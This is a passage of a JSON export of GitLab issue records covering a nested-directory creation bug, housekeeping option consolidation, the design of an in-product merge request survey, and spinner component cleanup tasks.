Wilson","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4708748/avatar.png","web_url":"https://gitlab.com/matt_wilson"},"type":"ISSUE","assignee":null,"user_notes_count":19,"merge_requests_count":0,"upvotes":3,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353788","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353788","notes":"https://gitlab.com/api/v4/projects/278964/issues/353788/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353788/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353788","relative":"#353788","full":"gitlab-org/gitlab#353788"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3590,"epic":{"id":68427,"iid":3590,"title":"Polished User Experience","url":"/groups/gitlab-org/-/epics/3590","group_id":9970},"iteration":null,"health_status":null},{"id":103002895,"iid":353780,"project_id":278964,"title":"New directory created in wrong location","description":"We're experiencing an issue while trying to create a nested directory via the web/repository view.\n\nWhen creating a new directory, instead of it being created within a sub folder, said directory gets created in the root of the project.\n\nWe are currently running omnibus version 14.8.1.  Last known working version was 13.6.\n\nExample demonstrating the behaviour is depicted below. We are trying to create a folder in /public/js/auxilium/dijits/templates/login of the repo.\n\n![image](/uploads/096bc3ec278c57afc3764732a3b33568/image.png)\n![image](/uploads/4e72cafe11e071c328d0fddca8cc841d/image.png)\n![image](/uploads/bd9cc8da8803e519238cd9b6103c23e9/image.png)","state":"closed","created_at":"2022-02-24T16:02:53.766Z","updated_at":"2022-07-21T10:37:44.351Z","closed_at":"2022-03-23T11:31:58.626Z","closed_by":{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"labels":["Category:Source Code Management","devops::create","frontend","group::source code","priority::2","section::dev","severity::2"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[],"author":{"id":904201,"username":"bigpic","name":"Ryan","state":"active","avatar_url":"https://secure.gravatar.com/avatar/d331ca57fb377925a573d97db09dea2d?s=80\u0026d=identicon","web_url":"https://gitlab.com/bigpic"},"type":"ISSUE","assignee":null,"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353780","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353780","notes":"https://gitlab.com/api/v4/projects/278964/issues/353780/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353780/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353780","relative":"#353780","full":"gitlab-org/gitlab#353780"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103001377,"iid":353778,"project_id":278964,"title":"Squash housekeeping period options with a single option","description":"## Summary\n\nWith the introduction of `OptimizeRepository` RPC some of the [housekeeping options](https://docs.gitlab.com/ee/administration/housekeeping.html#housekeeping-options) become redundant.\n\nCurrently, we have 3 options that are responsible for how often a particular optimization is called:\n\n- Incremental repack period: Number of Git pushes after which an incremental git repack is run.\n- Full repack period: Number of Git pushes after which a full git repack is run.\n- Git GC period: Number of Git pushes after which git gc is run.\n\nWith `OptimizeRepository` introduced, the frequency of a particular operation can't be controlled from Gitlab Rails anymore. Let's choose the lowest one out of these three (Incremental repack period) and use it as a value of how often `OptimizeRepository` is called.\n\n## Action steps\n\n- Replace the three options on the UI with a single one\n- Use `housekeeping_incremental_repack_period` column as a value of how often `OptimizeRepository` is called\n- Update the documentation to reflect the current state of things\n\n## Availability and Testing\n\nPlease assign a SET for MR review, likely changes to the existing tests required. Possibly a new E2E if coverage deemed insufficient (to be evaluated).","state":"closed","created_at":"2022-02-24T15:37:21.385Z","updated_at":"2023-01-04T23:21:42.975Z","closed_at":"2022-12-16T13:06:14.355Z","closed_by":{"id":1161495,"username":"igor.drozdov","name":"Igor Drozdov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1161495/avatar.png","web_url":"https://gitlab.com/igor.drozdov"},"labels":["Category:Source Code Management","Deliverable","SUS::Impacting","Technical Writing","UI text","[deprecated] Accepting merge requests","backend","devops::create","documentation","gitaly-cluster::maintenance","group::source code","infradev","maintenance::refactor","priority::3","production request","quad-planning::complete-action","section::dev","severity::3","type::maintenance","workflow::in review"],"milestone":{"id":2717597,"iid":82,"group_id":9970,"title":"15.7","description":"","state":"active","created_at":"2022-07-29T14:48:31.199Z","updated_at":"2022-07-29T14:48:31.199Z","due_date":"2022-12-17","start_date":"2022-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/82"},"assignees":[{"id":1161495,"username":"igor.drozdov","name":"Igor Drozdov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1161495/avatar.png","web_url":"https://gitlab.com/igor.drozdov"}],"author":{"id":1161495,"username":"igor.drozdov","name":"Igor Drozdov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1161495/avatar.png","web_url":"https://gitlab.com/igor.drozdov"},"type":"ISSUE","assignee":{"id":1161495,"username":"igor.drozdov","name":"Igor Drozdov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1161495/avatar.png","web_url":"https://gitlab.com/igor.drozdov"},"user_notes_count":56,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2023-02-08","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353778","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":2,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353778","notes":"https://gitlab.com/api/v4/projects/278964/issues/353778/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353778/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353778","relative":"#353778","full":"gitlab-org/gitlab#353778"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7629,"epic":{"id":450974,"iid":7629,"title":"Improve repository housekeeping by using OptimizeRepository RPC","url":"/groups/gitlab-org/-/epics/7629","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":102999874,"iid":353776,"project_id":278964,"title":"[SPIKE] Implement in-product MR Survey","description":"Following the design work in https://gitlab.com/gitlab-org/gitlab/-/issues/353775, we need to implement the in product survey to being collecting data.\n\nThis issue is to develop an implementation plan for future milestones.","state":"closed","created_at":"2022-02-24T15:16:29.415Z","updated_at":"2022-05-24T12:00:24.183Z","closed_at":"2022-05-18T14:40:06.589Z","closed_by":{"id":853414,"username":"andr3","name":"André Luís","state":"active","avatar_url":"https://secure.gravatar.com/avatar/241e39726efb512a29621070ccf26a90?s=80\u0026d=identicon","web_url":"https://gitlab.com/andr3"},"labels":["Deliverable","auto updated","devops::create","frontend","group::code review","merge requests","section::dev","spike","type::maintenance"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"}],"author":{"id":2935693,"username":"phikai","name":"Kai Armstrong","state":"active","avatar_url":"https://secure.gravatar.com/avatar/2c5d6a63b41cbeb3ea4cccda82e758e1?s=80\u0026d=identicon","web_url":"https://gitlab.com/phikai"},"type":"ISSUE","assignee":{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"},"user_notes_count":15,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353776","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353776","notes":"https://gitlab.com/api/v4/projects/278964/issues/353776/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353776/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353776","relative":"#353776","full":"gitlab-org/gitlab#353776"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7859,"epic":{"id":493565,"iid":7859,"title":"In-product survey on MRs performance","url":"/groups/gitlab-org/-/epics/7859","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":102999772,"iid":353775,"project_id":278964,"title":"Design: In-product MR Survey","description":"As part of https://gitlab.com/groups/gitlab-org/-/epics/6141 we need to design the widget that will be used to present and collect survey responses inside the merge request.\n\n### Design considerations\n\n- **Location**: The survey should not affect the layout or cover important elements. That means it will likely be shown at the bottom or bottom right corners of the screen. That said, we need to ensure it does not blend too much with the rest of the UI (e.g. the sidebar).\n- **Emphasis**: If there’s color and/or a transition, it may help people see it, regardless of where it’s located.\n- **Consistency**: Try to follow an existing UI pattern. The most similar is the [*notification* broadcast message](https://docs.gitlab.com/ee/user/admin_area/broadcast_messages.html) ([example](/uploads/b7623b95379691821586cad2021bc716/CleanShot_20220406101930.png)).\n- **Other dialogs**: Consider behavior when there are other dialogs, like broadcast messages.\n\n### Proposal\n\n- [▶️ Figma prototype](https://www.figma.com/proto/I5PesXDN8Qc41yS5oaH93V/In-product-MR-survey-%23353775?page-id=1%3A2\u0026node-id=1406%3A26\u0026viewport=322%2C48%2C0.5\u0026scaling=scale-down\u0026starting-point-node-id=1406%3A26\u0026hide-ui=1)\n- [📐 Figma specs](https://www.figma.com/file/I5PesXDN8Qc41yS5oaH93V/?node-id=1%3A2)\n- See explorations in the designs below :point_down:\n\n\u003cdetails\u003e\u003csummary\u003eDetails\u003c/summary\u003e\n\n1. **Show conditions**:\n   1. If the instance is GitLab.com (SaaS).\n   1. If the user is logged-in.\n   1. If Snowplow is not blocked by the browser. The browser may be using an ad-blocker or sending the “Do Not Track” signal.\n   1. If the user has not dismissed this survey in the **last 90 days**.\n   1. If no [*notification* broadcast message](https://docs.gitlab.com/ee/user/admin_area/broadcast_messages.html) ([example](/uploads/b7623b95379691821586cad2021bc716/CleanShot_20220406101930.png)) was visible **on page load**. For example, if I close a _notification_ broadcast message, the survey would only appear on reload/when visiting another MR. This is because the proposal has a similar design and placement to _notification_ broadcast messages.\n   1. If 10 seconds have passed after page load. This is to avoid asking users about their satisfaction immediately after the MR page is loaded.\n   1. If the user has only answered the first question (overall satisfaction), keep showing the second question (speed/performance) until they answer it or dismiss the survey.\n1. **Dismissal**: When the survey is completed or the user dismisses it (clicks the `X` button), the survey doesn't appear again to that user for the **next 90 days** (that should be possible using [`UserCallout`](https://docs.gitlab.com/ee/api/graphql/reference/#usercallout)).\n1. **Animations**:\n   1. The survey **moves in** from the bottom of the screen (just like a [toast](https://design.gitlab.com/components/toast/)), as seen in the [prototype](https://www.figma.com/proto/I5PesXDN8Qc41yS5oaH93V/In-product-MR-survey-%23353775?page-id=1%3A2\u0026node-id=1406%3A26\u0026viewport=322%2C48%2C0.5\u0026scaling=scale-down\u0026starting-point-node-id=1406%3A26\u0026hide-ui=1): `ease-in 200ms` This helps make it noticeable and less jarring.\n   1. Dismissing (click the `X` button) or moving between steps doesn't have any animation.\n   1. The final “thanks” step **fades out** after 5 seconds (just like a [toast](https://design.gitlab.com/components/toast/)).\n1. **Legal disclaimer**: Links to https://about.gitlab.com/privacy/\n1. **Questions**:\n   1. *Overall, how satisfied are you with merge requests?*\n   1. *How satisfied are you with the **speed/performance** of merge requests?*\n1. **Data automatically collected** (see [technical details](https://gitlab.com/gitlab-org/gitlab/-/issues/340965#note_830259223)):\n   1. MR days: Number of days in the last 30 days that the user visited an MR page.\n      1. This is already collected today through Snowplow.\n   1. Paid plan: Whether the user is a member of 1+ paid group(s) or not.\n      1. This is also already collected.\n   1. Account age: Number of days since user's account creation.\n      1. This is not collected today, but will be once the survey is implemented.\n\n\n\u003c/details\u003e","state":"closed","created_at":"2022-02-24T15:14:28.924Z","updated_at":"2022-07-28T07:35:45.924Z","closed_at":"2022-06-20T13:43:38.883Z","closed_by":{"id":626804,"username":"pedroms","name":"Pedro Moreira da Silva","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c306f087d191ac15549f3c11e3bed321?s=80\u0026d=identicon","web_url":"https://gitlab.com/pedroms"},"labels":["UX","auto updated","devops::create","group::code review","instrumentation","merge requests","missed:14.10","section::dev","type::maintenance","workflow::design"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":626804,"username":"pedroms","name":"Pedro Moreira da Silva","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c306f087d191ac15549f3c11e3bed321?s=80\u0026d=identicon","web_url":"https://gitlab.com/pedroms"}],"author":{"id":2935693,"username":"phikai","name":"Kai Armstrong","state":"active","avatar_url":"https://secure.gravatar.com/avatar/2c5d6a63b41cbeb3ea4cccda82e758e1?s=80\u0026d=identicon","web_url":"https://gitlab.com/phikai"},"type":"ISSUE","assignee":{"id":626804,"username":"pedroms","name":"Pedro Moreira da Silva","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c306f087d191ac15549f3c11e3bed321?s=80\u0026d=identicon","web_url":"https://gitlab.com/pedroms"},"user_notes_count":58,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353775","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353775","notes":"https://gitlab.com/api/v4/projects/278964/issues/353775/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353775/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353775","relative":"#353775","full":"gitlab-org/gitlab#353775"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7859,"epic":{"id":493565,"iid":7859,"title":"In-product survey on MRs performance","url":"/groups/gitlab-org/-/epics/7859","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":102998481,"iid":353758,"project_id":278964,"title":"Make spinners in app/views/users/show.html.haml Pajamas-compliant","description":"One or more spinners in `app/views/users/show.html.haml` are not Pajamas-compliant. See the [parent epic](https://gitlab.com/groups/gitlab-org/-/epics/7628) for guidance.","state":"closed","created_at":"2022-02-24T14:52:55.467Z","updated_at":"2022-04-18T11:14:45.307Z","closed_at":"2022-03-29T14:54:48.706Z","closed_by":{"id":5413811,"username":"peterhegman","name":"Peter Hegman","state":"active","avatar_url":"https://secure.gravatar.com/avatar/459d8635e9ab17a052c00ead1d7bf1e6?s=80\u0026d=identicon","web_url":"https://gitlab.com/peterhegman"},"labels":["Deliverable","OKR","SUS::Impacting","auto updated","component:spinner","devops::manage","frontend","group::organization","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::verification"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":5413811,"username":"peterhegman","name":"Peter Hegman","state":"active","avatar_url":"https://secure.gravatar.com/avatar/459d8635e9ab17a052c00ead1d7bf1e6?s=80\u0026d=identicon","web_url":"https://gitlab.com/peterhegman"}],"author":{"id":553096,"username":"markrian","name":"Mark Florian","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/553096/avatar.png","web_url":"https://gitlab.com/markrian"},"type":"ISSUE","assignee":{"id":5413811,"username":"peterhegman","name":"Peter Hegman","state":"active","avatar_url":"https://secure.gravatar.com/avatar/459d8635e9ab17a052c00ead1d7bf1e6?s=80\u0026d=identicon","web_url":"https://gitlab.com/peterhegman"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353758","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353758","notes":"https://gitlab.com/api/v4/projects/278964/issues/353758/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353758/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353758","relative":"#353758","full":"gitlab-org/gitlab#353758"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7628,"epic":{"id":450871,"iid":7628,"title":"Spinners \u003e HAML \u003e Migrate spinner markup to loading_icon helper","url":"/groups/gitlab-org/-/epics/7628","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102998470,"iid":353747,"project_id":278964,"title":"Make spinners in app/views/explore/groups/_groups.html.haml Pajamas-compliant","description":"One or more spinners in `app/views/explore/groups/_groups.html.haml` are not Pajamas-compliant. See the [parent epic](https://gitlab.com/groups/gitlab-org/-/epics/7628) for guidance.","state":"closed","created_at":"2022-02-24T14:52:54.944Z","updated_at":"2022-03-16T00:06:36.749Z","closed_at":"2022-03-09T08:02:12.134Z","closed_by":{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"},"labels":["OKR","SUS::Impacting","auto updated","component:spinner","devops::manage","frontend","group::import","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"}],"author":{"id":553096,"username":"markrian","name":"Mark Florian","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/553096/avatar.png","web_url":"https://gitlab.com/markrian"},"type":"ISSUE","assignee":{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353747","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353747","notes":"https://gitlab.com/api/v4/projects/278964/issues/353747/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353747/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353747","relative":"#353747","full":"gitlab-org/gitlab#353747"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7628,"epic":{"id":450871,"iid":7628,"title":"Spinners \u003e HAML \u003e Migrate spinner markup to loading_icon helper","url":"/groups/gitlab-org/-/epics/7628","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102998487,"iid":353764,"project_id":278964,"title":"Make spinners in app/views/groups/_archived_projects.html.haml Pajamas-compliant","description":"One or more spinners in `app/views/groups/_archived_projects.html.haml` are not Pajamas-compliant. See the [parent epic](https://gitlab.com/groups/gitlab-org/-/epics/7628) for guidance.","state":"closed","created_at":"2022-02-24T14:52:54.887Z","updated_at":"2022-03-16T00:06:39.297Z","closed_at":"2022-03-09T08:03:06.041Z","closed_by":{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"},"labels":["OKR","SUS::Impacting","auto updated","component:spinner","devops::manage","frontend","group::import","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"}],"author":{"id":553096,"username":"markrian","name":"Mark Florian","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/553096/avatar.png","web_url":"https://gitlab.com/markrian"},"type":"ISSUE","assignee":{"id":1749038,"username":"wortschi","name":"Martin Wortschack","state":"active","avatar_url":"https://secure.gravatar.com/avatar/81f1a88935a2a512aa14db650ed37fdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/wortschi"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353764","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353764","notes":"https://gitlab.com/api/v4/projects/278964/issues/353764/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353764/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353764","relative":"#353764","full":"gitlab-org/gitlab#353764"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7628,"epic":{"id":450871,"iid":7628,"title":"Spinners \u003e HAML \u003e Migrate spinner markup to loading_icon helper","url":"/groups/gitlab-org/-/epics/7628","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102998486,"iid":353763,"project_id":278964,"title":"Make spinners in app/views/admin/users/_users.html.haml Pajamas-compliant","description":"One or more spinners in `app/views/admin/users/_users.html.haml` are not Pajamas-compliant. See the [parent epic](https://gitlab.com/groups/gitlab-org/-/epics/7628) for guidance.","state":"closed","created_at":"2022-02-24T14:52:54.741Z","updated_at":"2022-11-22T18:59:25.820Z","closed_at":"2022-03-18T16:12:55.111Z","closed_by":{"id":4704683,"username":"justin_ho","name":"Justin Ho Tuan Duong","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4704683/avatar.png","web_url":"https://gitlab.com/justin_ho"},"labels":["Deliverable","OKR","SUS::Impacting","auto updated","component:spinner","devops::manage","frontend","group::foundations","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":4704683,"username":"justin_ho","name":"Justin Ho Tuan Duong","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4704683/avatar.png","web_url":"https://gitlab.com/justin_ho"}],"author":{"id":553096,"username":"markrian","name":"Mark Florian","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/553096/avatar.png","web_url":"https://gitlab.com/markrian"},"type":"ISSUE","assignee":{"id":4704683,"username":"justin_ho","name":"Justin Ho Tuan Duong","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4704683/avatar.png","web_url":"https://gitlab.com/justin_ho"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353763","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353763","notes":"https://gitlab.com/api/v4/projects/278964/issues/353763/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353763/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353763","relative":"#353763","full":"gitlab-org/gitlab#353763"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7628,"epic":{"id":450871,"iid":7628,"title":"Spinners \u003e HAML \u003e Migrate spinner markup to loading_icon helper","url":"/groups/gitlab-org/-/epics/7628","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102998489,"iid":353766,"project_id":278964,"title":"Make spinners in app/views/projects/mirrors/_ssh_host_keys.html.haml Pajamas-compliant","description":"One or more spinners in `app/views/projects/mirrors/_ssh_host_keys.html.haml` are not Pajamas-compliant. See the [parent epic](https://gitlab.com/groups/gitlab-org/-/epics/7628) for guidance.","state":"closed","created_at":"2022-02-24T14:52:54.732Z","updated_at":"2022-11-22T18:59:26.554Z","closed_at":"2022-04-09T02:28:11.353Z","closed_by":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"labels":["Deliverable","OKR","SUS::Impacting","auto updated","component:spinner","devops::manage","frontend","group::composition analysis","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::verification"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"}],"author":{"id":553096,"username":"markrian","name":"Mark 